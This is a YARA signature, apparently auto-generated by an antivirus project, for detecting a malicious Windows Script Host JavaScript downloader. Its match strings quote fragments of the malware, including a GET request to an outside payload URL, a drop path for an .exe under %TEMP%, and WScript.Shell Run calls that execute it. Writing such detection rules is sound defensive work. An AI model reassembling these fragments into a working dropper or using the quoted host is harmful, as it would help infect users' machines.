rule sig_20160329_580ed979770bdd0514f7ab67f7b26803 {
  meta:
    description = "datamaliciousorder - file 20160329_580ed979770bdd0514f7ab67f7b26803.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8a969a5747d502cffc269b3db6ed742395a313a18968ffc1c0614c51a187d93b"

  strings:
    $s1  = "h[r](\"GET\", \"http://caferacerpneus.com.br/lw2osd\", false);" fullword ascii
    $s2  = "function eI() {return Aq[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"lFEbptYU2.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Q](V() * 11); if (h[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var Aq = function O() {return WScript[PQ](\"WScript.Shell\");}(), GC = 11;" fullword ascii
    $s5  = "function I(zr, e){Bg = Bg * 1; return zr - e;};" fullword ascii
    $s6  = "function G(){return \"\" + U;};" fullword ascii
    $s7  = "function Xi() {return ((xK == true) && (xK == CZ)) ? 1 : Bg;};" fullword ascii
    $s8  = "function N(c0){Aq[\"Run\"](c0, Bg, Bg);};" fullword ascii
    $s9  = "function V(){return 22;};" fullword ascii
    $s10 = "function c(){return PQ;};" fullword ascii
    $s11 = " while (Xe){" fullword ascii
    $s12 = "return I(hI, cZ);" fullword ascii
    $s13 = "function gy()" fullword ascii
    $s14 = "function bd(Em) {var D = (1, 2, 3, 4, 5, Em); return D;};" fullword ascii
    $s15 = "var Zq = new this[\"Date\"]();" fullword ascii
    $s16 = "var xK = false;" fullword ascii
    $s17 = "var AM = false;" fullword ascii
    $s18 = "xK = true; " fullword ascii
    $s19 = "CZ = true; " fullword ascii
    $s20 = "var CZ = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}